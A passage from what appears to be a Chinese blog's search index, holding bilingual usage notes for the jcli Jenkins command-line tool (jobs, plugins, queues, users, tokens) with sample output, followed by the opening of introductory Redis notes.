的参数可调，调节监控间隔时间、触发条件，通常用不到。</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli center watch</span><br><span class="line">Jenkins Version: 2.190.2</span><br></pre></td></tr></table></figure>
<h4 id="completion"><a href="#completion" class="headerlink" title="completion"></a>completion</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Genereate bash completion scripts</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli completion </span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line"># Installing bash completion on macOS using homebrew</span><br><span class="line">        ## If running Bash 3.2 included with macOS</span><br><span class="line">        brew install bash-completion</span><br><span class="line">        ## or, if running Bash 4.1+</span><br><span class="line">        brew install bash-completion@2</span><br><span class="line">        ## you may need add the completion to your completion directory</span><br><span class="line">        jcli completion &gt; $(brew --prefix)/etc/bash_completion.d/jcli</span><br><span class="line">        ## If you get trouble, please visit https://github.com/jenkins-zh/jenkins-cli/issues/83.</span><br><span class="line"></span><br><span class="line">[root@VM_89_116_centos ~]# jcli completion &gt; $(brew --prefix)/etc/bash_completion.d/jcli</span><br></pre></td></tr></table></figure>
<h4 id="crumb"><a href="#crumb" class="headerlink" title="crumb"></a>crumb</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Print crumbIssuer of Jenkins</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli crumb </span><br><span class="line"></span><br><span class="line">example：</span><br><span class="line">  [root@VM_89_116_centos ~]# jcli crumb</span><br><span class="line">  Jenkins-Crumb=9775c2ca9bcbac492dcb16ca2509d5b7f89bae378553d1d761865c42ec3a924c</span><br></pre></td></tr></table></figure>
<h4 id="job"><a href="#job" class="headerlink" title="job"></a>job</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Print the job of your Jenkins</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job [flags]</span><br><span class="line">  jcli job [command]</span><br><span class="line"></span><br><span class="line">Available Commands:</span><br><span class="line">  artifact    Print the artifact list of target job：   显示出目标 job 的所有制品</span><br><span class="line">  build       Build the job of your Jenkins：           构建job</span><br><span class="line">  create      Create a job in your Jenkins：            创造job</span><br><span class="line">  delete      Delete a job in your Jenkins              删除job</span><br><span class="line">  edit        Edit the job of your Jenkins              修改一个job</span><br><span class="line">  history     Print the history of job in your Jenkins  显示出 job 历史记录</span><br><span class="line">  input       Input a job in your Jenkins               输入一个 job</span><br><span class="line">  log         Print the job of your Jenkins             打印 job 日志</span><br><span class="line">  param       Get param of the job of your Jenkins      获取 job 的参数</span><br><span class="line">  search      Print the job of your Jenkins             查询 job</span><br><span class="line">  stop        Stop a job build in your Jenkins          停止 job</span><br><span class="line">  type        Print the types of job which in your Jenkins   打印出 job 的类型</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -h, --help            help for job</span><br><span class="line">  -o, --output string   Format the output (default &quot;json&quot;)</span><br></pre></td></tr></table></figure>
<h5 id="artifact-（？）"><a href="#artifact-（？）" class="headerlink" title="artifact （？）"></a>artifact （？）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Print the artifact list of target job</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job artifact &lt;jobName&gt; [buildID] [flags]</span><br><span class="line">  jcli job artifact [command]</span><br><span class="line"></span><br><span class="line">Available Commands:</span><br><span class="line">  download    Download the artifact of target job</span><br><span class="line">Flags:</span><br><span class="line">  -h, --help</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli job artifact download &lt;jobName&gt; [buildID] [flags]</span><br><span class="line"></span><br><span class="line">Download the artifact of target job</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">      --download-dir string   The directory which artifact will be downloaded</span><br><span class="line">  -h, --help                  help for download</span><br><span class="line">  -i, --id string             ID of the job artifact</span><br><span class="line">      --progress              Whether show the progress (default true)</span><br></pre></td></tr></table></figure>
<h5 id="build"><a href="#build" class="headerlink" title="build"></a>build</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Build the job of your Jenkins</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job build &lt;jobName&gt; [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -b, --batch          Batch mode, no need confirm   批处理模式，无需确认</span><br><span class="line">  -h, --help           help for build</span><br><span class="line">      --param string   Params of the job             作业参数</span><br><span class="line">      --verbose        Output the verbose            详细输出</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli job build devops_ci_cd_pipline_ex1 -b --verbose</span><br></pre></td></tr></table></figure>
<h5 id="create-（？）"><a href="#create-（？）" class="headerlink" title="create （？）"></a>create （？）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Create a job in your Jenkins</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job create &lt;jobName&gt; [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">      --copy string   Copy an exists job</span><br><span class="line">  -h, --help          help for create</span><br><span class="line">      --type string   Which type do you want to create</span><br><span class="line"></span><br><span class="line">type:</span><br><span class="line">    Folder</span><br><span class="line">    GitHub Organization</span><br><span class="line">    Multibranch Pipeline</span><br><span class="line">    Freestyle project</span><br><span class="line">    Maven project</span><br><span class="line">    Multi-configuration project</span><br><span class="line">    Pipeline</span><br><span class="line">    External Job</span><br><span class="line">    MultiJob Project</span><br><span class="line"></span><br><span class="line">example: </span><br><span class="line">通过复制已有任务来创建新任务</span><br><span class="line">[root@VM_89_116_centos ~]# jcli job create ex4 --copy devops_ci_cd_pipline_ex1</span><br><span class="line">创建新任务</span><br><span class="line">[root@VM_89_116_centos ~]# jcli job create ex5</span><br></pre></td></tr></table></figure>
<h5 id="edit（？）"><a href="#edit（？）" class="headerlink" title="edit（？）"></a>edit（？）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Edit the job of your Jenkins </span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job edit &lt;jobName&gt; </span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli job edit devops_pipeline</span><br><span class="line">2019/11/14 14:29:50 Not found resources</span><br><span class="line">没用，怀疑控制浏览器打开。</span><br></pre></td></tr></table></figure>
<h5 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Delete a job in your Jenkins</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job delete &lt;jobName&gt; [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -b, --batch   Batch mode, no need confirm   不用询问确认是否创建</span><br><span class="line">  -h, --help    help for delete</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli job delete ex5 -b</span><br></pre></td></tr></table></figure>
<h5 id="stop"><a href="#stop" class="headerlink" title="stop"></a>stop</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Stop a job build in your Jenkins</span><br><span class="line">似乎有 bug ，要触发两次才能生效。</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job stop &lt;jobName&gt; &lt;buildNumber&gt; [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -b, --batch   Batch mode, no need confirm          批处理模式，无需确认</span><br><span class="line">  -h, --help    help for stop</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">    jcli job stop devops_ci_cd_pipline_ex1 37 -b</span><br></pre></td></tr></table></figure>
<h5 id="input（？）"><a href="#input（？）" class="headerlink" title="input（？）"></a>input（？）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input a job in your Jenkins</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job input &lt;jobName&gt; [buildID] [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">      --action string   The action wether you want to process or abort.  </span><br><span class="line">                        活动处理或者终止</span><br><span class="line">  -h, --help            help for input</span><br></pre></td></tr></table></figure>
<h5 id="history"><a href="#history" class="headerlink" title="history"></a>history</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Print the history of job in your Jenkins</span><br><span class="line">查看历史构建状态。</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job history &lt;jobName&gt; </span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli job history devops_ci_cd_pipline_ex1</span><br><span class="line">    number displayname building result</span><br><span class="line">    0      #42         false    FAILURE</span><br><span class="line">    1      #41         true</span><br><span class="line">    2      #40         true</span><br><span class="line">    3      #39         false    SUCCESS</span><br><span class="line">    4      #38         false    ABORTED</span><br></pre></td></tr></table></figure>
<h5 id="log"><a href="#log" class="headerlink" title="log"></a>log</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看历史构建日志信息（控制台输出信息）。</span><br><span class="line">Usage:</span><br><span class="line">  jcli job log &lt;jobName&gt; [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -h, --help           help for log</span><br><span class="line">  -s, --history int    Specific build history of log (default -1)  特殊构建历史日志</span><br><span class="line">  -i, --interval int   Interval of watch (default 1)               查看间隔</span><br><span class="line">  -w, --watch          Watch the job logs                          查看 job 日志</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli job log devops_ci_cd_pipline_ex1</span><br></pre></td></tr></table></figure>
<h5 id="search"><a href="#search" class="headerlink" title="search"></a>search</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli job search [keyword] [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">      --all       Print all items if there&apos;s no keyword</span><br><span class="line">                  打印所有 job</span><br><span class="line">  -h, --help      help for search</span><br><span class="line">      --max int   The number of limitation to print (default 10)</span><br><span class="line">                  每次打印限制个数，默认为10</span><br></pre></td></tr></table></figure>
<h5 id="type"><a href="#type" class="headerlink" title="type"></a>type</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Print the types of job which in your Jenkins   统计 jenkins 里面的类型</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job type &lt;jobName&gt;</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli job type devops_ci_cd_pipline_ex1</span><br><span class="line">    number name                        type</span><br><span class="line">    0      Freestyle project           Standalone Projects</span><br><span class="line">    1      Maven project               Standalone Projects</span><br><span class="line">    2      Pipeline                    Standalone Projects</span><br><span class="line">    3      External Job                Standalone Projects</span><br><span class="line">    4      Multi-configuration project Standalone Projects</span><br><span class="line">    0      MultiJob Project            Uncategorized</span><br><span class="line">    0      Folder                      Nested Projects</span><br><span class="line">    1      GitHub Organization         Nested Projects</span><br><span class="line">    2      Multibranch Pipeline        Nested Projects</span><br></pre></td></tr></table></figure>
<h5 id="param（？）"><a href="#param（？）" class="headerlink" title="param（？）"></a>param（？）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get param of the job of your Jenkins</span><br><span class="line">获取 job 的参数</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job param &lt;jobName&gt; [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -h, --help     help for param</span><br><span class="line">      --indent   Output with indent    缩进输出</span><br></pre></td></tr></table></figure>
<h4 id="open"><a href="#open" class="headerlink" title="open"></a>open</h4><p>Open your Jenkins with a browse<br>（用不到）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli open [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -c, --config        Open the configuration page of Jenkins</span><br><span class="line">  -h, --help          help for open</span><br><span class="line">  -i, --interactive   Interactive mode</span><br><span class="line">  -n, --name string   Open a specific Jenkins by name</span><br></pre></td></tr></table></figure></p>
<h4 id="plugin"><a href="#plugin" class="headerlink" title="plugin"></a>plugin</h4><p>插件管理<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli plugin [command]</span><br><span class="line"></span><br><span class="line">Available Commands:</span><br><span class="line">  check       Checkout update center server                 检查可更新</span><br><span class="line">  download    Download the plugins                          下载插件</span><br><span class="line">  install     Install the plugins                           安装插件</span><br><span class="line">  list        Print all the plugins which are installed     打印已安装的插件</span><br><span class="line">  open        Openout update center server                  启动更新</span><br><span class="line">  search      Print the plugins of your Jenkins             查找已安装的插件</span><br><span class="line">  trend       Show the trend of the plugin                  显示出插件趋势</span><br><span class="line">  uninstall   Uninstall the plugins                         卸载插件</span><br><span class="line">  upgrade     Upgrade the specific plugin                   更新特定的插件</span><br><span class="line">  upload      Upload a plugin  to your Jenkins              上传插件</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line"></span><br><span class="line">  jcli plugin upgrade [plugin name] --filter stringArray   Filter for the list, like: name=foo</span><br></pre></td></tr></table></figure></p>
<h5 id="upgrade-1"><a href="#upgrade-1" class="headerlink" title="upgrade"></a>upgrade</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Upgrade the specific plugin</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli plugin upgrade [plugin name] [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">      --filter stringArray   Filter for the list, like: name=foo    筛选</span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli plugin upgrade pipeline-model-api</span><br></pre></td></tr></table></figure>
<h5 id="trend"><a href="#trend" class="headerlink" title="trend"></a>trend</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Show the trend of the plugin</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli plugin trend &lt;pluginName&gt; </span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli plugin trend pipeline-model-api</span><br><span class="line">***************** 180628</span><br><span class="line">***************** 179369</span><br></pre></td></tr></table></figure>
<h5 id="check"><a href="#check" class="headerlink" title="check"></a>check</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Checkout update center server</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli plugin check </span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli plugin check -h</span><br><span class="line">Checkout update center server</span><br></pre></td></tr></table></figure>
<h5 id="download-1"><a href="#download-1" class="headerlink" title="download"></a>download</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Download the plugins</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli plugin download &lt;keyword&gt;        关键字。。。。</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli plugin download pipeline-github</span><br><span class="line">Start to collect plugin dependencies...</span><br><span class="line">Ready to download plugins, total: 31.</span><br><span class="line">Start to download plugin pipeline-github, version: 2.5, number: 0</span><br><span class="line">Start to download plugin workflow-cps, version: 2.76, number: 1</span><br><span class="line">Start to download plugin workflow-api, version: 2.37, number: 2</span><br><span class="line">Start to download plugin workflow-step-api, version: 2.20, number: 3</span><br><span class="line">Start to download plugin structs, version: 1.20, number: 4</span><br><span class="line">Start to download plugin jdk-tool, version: 1.3, number: 5</span><br><span class="line">Start to download plugin jaxb, version: 2.3.0.1, number: 6</span><br><span class="line">Start to download plugin trilead-api, version: 1.0.5, number: 7</span><br><span class="line">Start to download plugin scm-api, version: 2.6.3, number: 8</span><br></pre></td></tr></table></figure>
<h5 id="uninstall"><a href="#uninstall" class="headerlink" title="uninstall"></a>uninstall</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Uninstall the plugins</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli plugin uninstall [pluginName] </span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli plugin uninstall mapdb-api</span><br></pre></td></tr></table></figure>
<h5 id="install"><a href="#install" class="headerlink" title="install"></a>install</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Install the plugins</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli plugin install [pluginName] [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -h, --help           help for install</span><br><span class="line">      --suite string   Suite of plugins</span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli plugin install pipeline-github</span><br></pre></td></tr></table></figure>
<h5 id="search-1"><a href="#search-1" class="headerlink" title="search"></a>search</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@VM_89_116_centos ~]# jcli plugin search github</span><br><span class="line">number name                                  installed version installedVersion title</span><br><span class="line">0      github-branch-source                  true              2.5.8            GitHub Branch Source Plugin</span><br><span class="line">1      github                                true              1.29.5           GitHub plugin</span><br><span class="line">2      github-api                            true              1.95             GitHub API Plugin</span><br><span class="line">3      pipeline-github-lib                   true              1.0              Pipeline: GitHub Groovy Libraries</span><br><span class="line">4      blueocean-github-pipeline             false     1.19.0                   GitHub Pipeline for Blue Ocean</span><br><span class="line">5      disable-github-multibranch-status     false     1.1                      Disable GitHub Multibranch Status</span><br><span class="line">6      github-autostatus                     false     3.6.0                    Job and Stage monitoring</span><br><span class="line">7      github-coverage-reporter              false     1.8                      GitHub Coverage Reporter</span><br><span class="line">8      github-issues                         false     1.2.4                    GitHub Issues</span><br><span class="line">9      github-oauth                          false     0.33                     GitHub Authentication</span><br><span class="line">10     github-organization-folder            false     1.6                      GitHub Organization Folder</span><br><span class="line">11     github-pr-comment-build               false     2.1                      GitHub PR Comment Build</span><br><span class="line">12     github-pr-coverage-status             false     2.1.1                    GitHub Pull Request Coverage Status</span><br><span class="line">13     github-pullrequest                    false     0.2.6</span><br></pre></td></tr></table></figure>
<h5 id="list-1"><a href="#list-1" class="headerlink" title="list"></a>list</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@VM_89_116_centos ~]# jcli plugin list</span><br><span class="line">number name                               version    update</span><br><span class="line">0      mercurial                          2.8        false</span><br><span class="line">1      pipeline-milestone-step            1.3.1      false</span><br><span class="line">2      locale                             1.4        false</span><br><span class="line">3      teamconcert                        1.3.0      false</span><br><span class="line">4      mapdb-api                          1.0.9.0    false</span><br><span class="line">5      throttle-concurrents               2.0.1      false</span><br><span class="line">6      workflow-scm-step                  2.9        false</span><br><span class="line">7      tfs                                5.157.0    false</span><br><span class="line">8      cvs                                2.14       false</span><br><span class="line">9      credentials-binding                1.20       false</span><br><span class="line">10     matrix-auth                        2.5        false</span><br><span class="line">11     pam-auth                           1.6        false</span><br><span class="line">12     ssh                                2.6.1      false</span><br><span class="line">13     emailext-template                  1.1        false</span><br><span class="line">14     momentjs                           1.1.1      false</span><br></pre></td></tr></table></figure>
<h5 id="upload"><a href="#upload" class="headerlink" title="upload:"></a>upload:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Upload a plugin from local filesystem or remote URL to your Jenkins</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli plugin upload [flags]</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  upload, up</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -h, --help                     help for upload</span><br><span class="line">  -r, --remote string            Remote plugin URL</span><br><span class="line">      --remote-jenkins string    Remote Jenkins which will find from config list</span><br><span class="line">      --remote-password string   Password of remote plugin URL</span><br><span class="line">      --remote-user string       User of remote plugin URL</span><br><span class="line">      --show-progress            Whether show the upload progress (default true)</span><br><span class="line">      --skip-posthook            Whether skip the post command hook</span><br><span class="line">      --skip-prehook             Whether skip the previous command hook</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">    jcli plugin upload --remote https://server/sample.hpi</span><br><span class="line">    jcli plugin upload sample.hpi</span><br><span class="line">    jcli plugin upload sample.hpi --show-progress=false</span><br></pre></td></tr></table></figure>
<h4 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h4><p>队列管理</p>
<h5 id="list-2"><a href="#list-2" class="headerlink" title="list"></a>list</h5><p>列出所有队列<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli queue list [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -h, --help            help for list</span><br><span class="line">  -o, --output string   Format the output (default &quot;json&quot;)</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli queue list</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;Items&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Blocked&quot;: false,</span><br><span class="line">      &quot;Buildable&quot;: true,</span><br><span class="line">      &quot;ID&quot;: 122,</span><br><span class="line">      &quot;Params&quot;: &quot;&quot;,</span><br><span class="line">      &quot;Pending&quot;: false,</span><br><span class="line">      &quot;Stuck&quot;: false,</span><br><span class="line">      &quot;URL&quot;: &quot;queue/item/122/&quot;,</span><br><span class="line">      &quot;Why&quot;: &quot;等待下一个可用的执行器&quot;,</span><br><span class="line">      &quot;BuildableStartMilliseconds&quot;: 1573714706814,</span><br><span class="line">      &quot;InQueueSince&quot;: 1573714706758,</span><br><span class="line">      &quot;Actions&quot;: []</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Blocked&quot;: false,</span><br><span class="line">      &quot;Buildable&quot;: true,</span><br><span class="line">      &quot;ID&quot;: 120,</span><br><span class="line">      &quot;Params&quot;: &quot;&quot;,</span><br><span class="line">      &quot;Pending&quot;: false,</span><br><span class="line">      &quot;Stuck&quot;: false,</span><br><span class="line">      &quot;URL&quot;: &quot;queue/item/120/&quot;,</span><br><span class="line">      &quot;Why&quot;: &quot;等待下一个可用的执行器&quot;,</span><br><span class="line">      &quot;BuildableStartMilliseconds&quot;: 1573714673447,</span><br><span class="line">      &quot;InQueueSince&quot;: 1573714673446,</span><br><span class="line">      &quot;Actions&quot;: []</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Blocked&quot;: false,</span><br><span class="line">      &quot;Buildable&quot;: true,</span><br><span class="line">      &quot;ID&quot;: 118,</span><br><span class="line">      &quot;Params&quot;: &quot;&quot;,</span><br><span class="line">      &quot;Pending&quot;: false,</span><br><span class="line">      &quot;Stuck&quot;: false,</span><br><span class="line">      &quot;URL&quot;: &quot;queue/item/118/&quot;,</span><br><span class="line">      &quot;Why&quot;: &quot;等待下一个可用的执行器&quot;,</span><br><span class="line">      &quot;BuildableStartMilliseconds&quot;: 1573714663446,</span><br><span class="line">      &quot;InQueueSince&quot;: 1573714663418,</span><br><span class="line">      &quot;Actions&quot;: []</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h5 id="cancel"><a href="#cancel" class="headerlink" title="cancel"></a>cancel</h5><p>取消队列<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli queue cancel &lt;id&gt; [flags]</span><br><span class="line">Flags:</span><br><span class="line">  -h, --help</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli queue cancel 118</span><br></pre></td></tr></table></figure></p>
<h4 id="restart"><a href="#restart" class="headerlink" title="restart"></a>restart</h4><p>重启<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli restart [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -b, --batch   Batch mode, no need confirm</span><br></pre></td></tr></table></figure></p>
<h4 id="user"><a href="#user" class="headerlink" title="user"></a>user</h4><p>用户管理<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli user [flags]</span><br><span class="line">  jcli user [command]</span><br><span class="line"></span><br><span class="line">Available Commands:</span><br><span class="line">  create      Create a user for your Jenkins</span><br><span class="line">  delete      Delete a user for your Jenkins</span><br><span class="line">  edit        Edit the user of your Jenkins</span><br><span class="line">  token       Token the user of your Jenkins</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -h, --help            help for user</span><br><span class="line">  -o, --output string   Format the output (default &quot;json&quot;)</span><br></pre></td></tr></table></figure></p>
<h5 id="create"><a href="#create" class="headerlink" title="create"></a>create</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jcli user create &lt;username&gt; [password] </span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli user create admin1 admin1</span><br><span class="line">create user success. Password is: admin1</span><br></pre></td></tr></table></figure>
<h5 id="delete-1"><a href="#delete-1" class="headerlink" title="delete"></a>delete</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli user delete &lt;username&gt; [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -b, --batch   Batch mode, no need confirm           批处理模式，无需确认</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli user delete admin1</span><br><span class="line">? Are you sure to delete user admin1 ? Yes</span><br></pre></td></tr></table></figure>
<h5 id="edit-1"><a href="#edit-1" class="headerlink" title="edit"></a>edit</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli user edit [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -d, --desc   Edit the description</span><br><span class="line"></span><br><span class="line">仅仅修改描述，不支持修改密码权等高级功能</span><br></pre></td></tr></table></figure>
<h5 id="token"><a href="#token" class="headerlink" title="token"></a>token</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli user token -g [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -g, --generate      Generate the token</span><br><span class="line">  -n, --name string   Name of the token</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli user token -g</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;Status&quot;: &quot;ok&quot;,</span><br><span class="line">  &quot;Data&quot;: &#123;</span><br><span class="line">    &quot;TokenName&quot;: &quot;jcli-Mouseflash&quot;,</span><br><span class="line">    &quot;TokenUUID&quot;: &quot;d7de368b-bb54-44a4-99ef-db1674a07e42&quot;,</span><br><span class="line">    &quot;TokenValue&quot;: &quot;1109aceacc74236930f5ef2d6372d2704e&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[root@VM_89_116_centos ~]# jcli user token -g -n 测试</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;Status&quot;: &quot;ok&quot;,</span><br><span class="line">  &quot;Data&quot;: &#123;</span><br><span class="line">    &quot;TokenName&quot;: &quot;测试&quot;,</span><br><span class="line">    &quot;TokenUUID&quot;: &quot;8a642d49-78ee-448a-8abc-59d29b5f4a68&quot;,</span><br><span class="line">    &quot;TokenValue&quot;: &quot;114229e08012d8b29f15d98986ef0f8f09&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="问题总结"><a href="#问题总结" class="headerlink" title="问题总结"></a>问题总结</h4><p>1、jcli job build devops_ci_cd_pipline_ex1 -b<br>不支持连续，需要等待上一条 build 完全进入 build 才会 启动下一条 build</p>
<p>2、不支持查看正在构建的任务清单。</p>
<p>3、不支持修改构建任务的配置。</p>
<p>4、不支持查看已经存在的用户列表</p>
]]></content>
      <categories>
        <category>Jenkins</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>Jenkins</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-入门笔记</title>
    <url>/Redis-%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="八个特性"><a href="#八个特性" class="headerlink" title="八个特性"></a>八个特性</h2><h3 id="速度快"><a href="#速度快" class="headerlink" title="速度快"></a>速度快</h3><p>数据存在内存上<br>用 C 语言写的<br>线程模型是单线程</p>
<h3 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h3><p>断电不丢数据<br>所有数据保存在内存中，对数据的更新将异步地保存到磁盘中<br><a id="more"></a></p>
<h3 id="多种数据结构"><a href="#多种数据结构" class="headerlink" title="多种数据结构"></a>多种数据结构</h3><p><img data-src="http://tuchuang.xchcloud.cn/数据结构图.png" alt="图一"></p>
<p>其他：</p>
<p>BitMaps：位图<br>HyperLogLog：超小内存唯一数值<br>GEO：地理信息定位</p>
<h3 id="支持多种编程语言"><a href="#支持多种编程语言" class="headerlink" title="支持多种编程语言"></a>支持多种编程语言</h3><h3 id="功能丰富"><a href="#功能丰富" class="headerlink" title="功能丰富"></a>功能丰富</h3><p>发布订阅</p>
<p>事务</p>
<p>Lua 脚本</p>
<p>pipeline</p>
<h3 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h3><p>只有 23000 行 C 代码：单机的</p>
<p>不依赖外部库</p>
<p>单线程模型</p>
<h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>高可用、分布式</p>
